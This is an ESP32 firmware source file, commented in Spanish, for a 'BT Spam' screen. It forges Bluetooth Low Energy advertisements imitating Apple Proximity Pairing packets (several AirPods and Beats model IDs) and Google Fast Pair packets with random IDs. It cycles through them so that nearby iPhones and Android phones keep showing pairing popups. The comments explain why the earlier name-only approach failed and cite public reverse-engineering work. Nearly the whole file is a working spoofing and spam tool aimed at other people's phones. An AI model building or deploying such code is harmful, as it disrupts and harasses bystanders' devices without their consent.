#include "Apps/screen_btspam.h"
#include "Drivers/buzzer.h"
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <esp_random.h>

// ---------------------------------------------------------------------
//  BT Spam
//  ------------------------------------------------------------------
//  La version anterior solo cambiaba el "nombre" anunciado por BLE
//  (BLEAdvertisementData::setName). Eso SI se transmite, pero ningun
//  telefono moderno muestra eso como notificacion: para verlo hacia
//  falta abrir a mano un scanner BLE (nRF Connect, LightBlue) y mirar
//  la lista de dispositivos cercanos. Por eso "nunca funciono": no es
//  que el radio no emitiera, es que anunciar solo un nombre no es la
//  tecnica que dispara popups.
//
//  Lo que realmente hace aparecer el cartel de "Conectar" en iPhones
//  cercanos (estilo Flipper Zero / ESP32 Marauder) es imitar el
//  paquete "Proximity Pairing" del protocolo Apple Continuity (no
//  documentado oficialmente por Apple; reversado por la comunidad,
//  ver https://github.com/furiousMAC/continuity). En Android se puede
//  intentar el equivalente con Google Fast Pair.
//
//  Nota: el "Action Flags"/relleno de datos cifrados no esta
//  documentado; se randomiza en cada paquete, que es lo que hacen
//  tambien los proyectos publicos de BLE spam. Los IDs de modelo Apple
//  de esta lista circulan en varios repos publicos (solo AirPods Pro
//  = 0x0E20 esta confirmado por furiousMAC/continuity); si tu iOS no
//  muestra alguno, probá ajustarlo.
// ---------------------------------------------------------------------

static const uint8_t APPLE_COMPANY[2] = {0x4C, 0x00}; // Apple Inc.

struct AppleModel { uint8_t hi, lo; const char* label; };
static const AppleModel APPLE_MODELS[] = {
  {0x0E, 0x20, "AirPods Pro"},
  {0x02, 0x20, "AirPods"},
  {0x0A, 0x20, "AirPods Max"},
  {0x13, 0x20, "AirPods 2"},
  {0x0C, 0x20, "Powerbeats3"},
};
static const int APPLE_MODEL_COUNT = sizeof(APPLE_MODELS) / sizeof(APPLE_MODELS[0]);
static const int TOTAL_STEPS = APPLE_MODEL_COUNT + 1; // + 1 paso para Fast Pair (Android)

static const unsigned long ROTATE_INTERVAL_MS = 2000; // 2s por paquete

static BLEAdvertising* pAdvertising = nullptr;
static bool           spamming     = false;
static int            step         = 0;
static unsigned long  lastSwitchMs = 0;

static uint8_t rnd8() { return (uint8_t)(esp_random() & 0xFF); }

static void appendByte(String& s, uint8_t b) { s += (char)b; }

// ---------- Apple: mensaje "Proximity Pairing" (tipo 0x07) ----------
// Estructura (furiousMAC/continuity): type, length, prefijo, modelo(2),
// status, bateria izq/der, 3 flags de carga, bateria estuche, contador
// de tapa, color, sufijo, 16 bytes de datos cifrados (no documentados).
static void buildApplePacket(int i) {
  String payload; // Company ID + cuerpo del mensaje

  appendByte(payload, APPLE_COMPANY[0]);
  appendByte(payload, APPLE_COMPANY[1]);

  String body;
  appendByte(body, 0x01);                    // prefijo
  appendByte(body, APPLE_MODELS[i].hi);       // modelo (hi)
  appendByte(body, APPLE_MODELS[i].lo);       // modelo (lo)
  appendByte(body, 0x55);                     // status: ambos en el estuche
  appendByte(body, rnd8() % 11);              // bateria izquierda (x10%)
  appendByte(body, rnd8() % 11);              // bateria derecha (x10%)
  appendByte(body, 0x00);                     // cargando: estuche
  appendByte(body, 0x00);                     // cargando: derecho
  appendByte(body, 0x00);                     // cargando: izquierdo
  appendByte(body, rnd8() % 11);              // bateria del estuche (x10%)
  appendByte(body, rnd8() & 0x07);            // contador de apertura de tapa
  appendByte(body, 0x00);                     // color (blanco)
  appendByte(body, 0x00);                     // sufijo
  for (int k = 0; k < 16; k++) appendByte(body, rnd8()); // datos "cifrados": no documentado, se randomiza

  appendByte(payload, 0x07);                  // tipo: Proximity Pairing
  appendByte(payload, (uint8_t)body.length()); // longitud del resto
  payload += body;

  BLEAdvertisementData advData;
  advData.setFlags(0x06);
  advData.setManufacturerData(payload);
  pAdvertising->setAdvertisementData(advData);
}

// ---------- Google: Fast Pair (servicio 0xFEC2) ----------
static void buildFastPairPacket() {
  String modelId;
  appendByte(modelId, rnd8());
  appendByte(modelId, rnd8());
  appendByte(modelId, rnd8());

  BLEAdvertisementData advData;
  advData.setFlags(0x06);
  advData.setCompleteServices(BLEUUID((uint16_t)0xFEC2));
  advData.setServiceData(BLEUUID((uint16_t)0xFEC2), modelId);
  pAdvertising->setAdvertisementData(advData);
}

static const char* stepLabel() {
  if (step < APPLE_MODEL_COUNT) return APPLE_MODELS[step].label;
  return "Fast Pair (Android)";
}

static void sendCurrentPacket() {
  if (step < APPLE_MODEL_COUNT) buildApplePacket(step);
  else                          buildFastPairPacket();
}

static void startSpam() {
  if (spamming) return;

  // El radio 2.4GHz es compartido entre WiFi y BLE en este chip: si
  // quedo algo de WiFi encendido de otra pantalla, se apaga aqui para
  // no pelear con el controlador de BLE.
  WiFi.mode(WIFI_OFF);

  BLEDevice::init("Camioneta");
  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->setScanResponse(false);

  step = 0;
  sendCurrentPacket();
  pAdvertising->start();

  spamming     = true;
  lastSwitchMs = millis();
  Serial.println(F("BT Spam: iniciado"));
}

static void stopSpam() {
  if (!spamming) return;

  if (pAdvertising) pAdvertising->stop();
  BLEDevice::deinit(true);

  spamming = false;
  Serial.println(F("BT Spam: detenido"));
}

// ---------- Botones ----------

static bool isButtonJustPressed(int pin) {
  static uint8_t lastStableState[4] = {HIGH, HIGH, HIGH, HIGH};
  static uint8_t lastReading[4]     = {HIGH, HIGH, HIGH, HIGH};
  static unsigned long lastDebounceTime[4] = {0, 0, 0, 0};

  const int pins[4] = {PIN_SELECT, PIN_UP, PIN_DOWN, PIN_BACK};
  int index = -1;

  for (int i = 0; i < 4; i++) {
    if (pins[i] == pin) { index = i; break; }
  }
  if (index == -1) return false;

  uint8_t reading = digitalRead(pin);

  if (reading != lastReading[index]) {
    lastDebounceTime[index] = millis();
    lastReading[index] = reading;
  }

  if ((millis() - lastDebounceTime[index]) > 50) {
    if (lastStableState[index] == HIGH && reading == LOW) {
      lastStableState[index] = reading;
      return true;
    }
    lastStableState[index] = reading;
  }
  return false;
}

// ---------- Pantalla ----------

void screenBtSpamLoop() {
  // Rota al siguiente paquete cada ROTATE_INTERVAL_MS sin bloquear.
  if (spamming && millis() - lastSwitchMs >= ROTATE_INTERVAL_MS) {
    lastSwitchMs = millis();
    step = (step + 1) % TOTAL_STEPS;
    pAdvertising->stop();
    sendCurrentPacket();
    pAdvertising->start();
  }

  if (isButtonJustPressed(PIN_BACK)) {
    buzzerClick();
    if (spamming) stopSpam();
    currentScreen = SCREEN_APPS;
    return;
  }

  if (isButtonJustPressed(PIN_SELECT)) {
    buzzerBeep();
    if (spamming) stopSpam();
    else          startSpam();
  }

  u8g2.clearBuffer();
  u8g2.setFontMode(1);
  u8g2.setBitmapMode(1);
  u8g2.setFont(u8g2_font_6x10_tr);

  u8g2.drawStr(34, 10, "BT Spam");
  u8g2.drawLine(0, 12, 127, 12);

  char line[24];

  if (spamming) {
    u8g2.drawDisc(10, 21, 3);
    u8g2.drawStr(16, 25, "ON");
  } else {
    u8g2.drawCircle(10, 21, 3);
    u8g2.drawStr(16, 25, "OFF");
  }
  snprintf(line, sizeof(line), "%d/%d", step + 1, TOTAL_STEPS);
  u8g2.drawStr(96, 25, line);

  u8g2.setFont(u8g2_font_5x7_tr);
  if (spamming) {
    u8g2.drawStr(6, 40, stepLabel());
  } else {
    u8g2.drawStr(6, 39, "Listo para anunciar");
  }

  u8g2.drawStr(6, 62, "BACK: Salir");
  u8g2.drawStr(6, 52, "SEL: Iniciar");

  u8g2.sendBuffer();
}
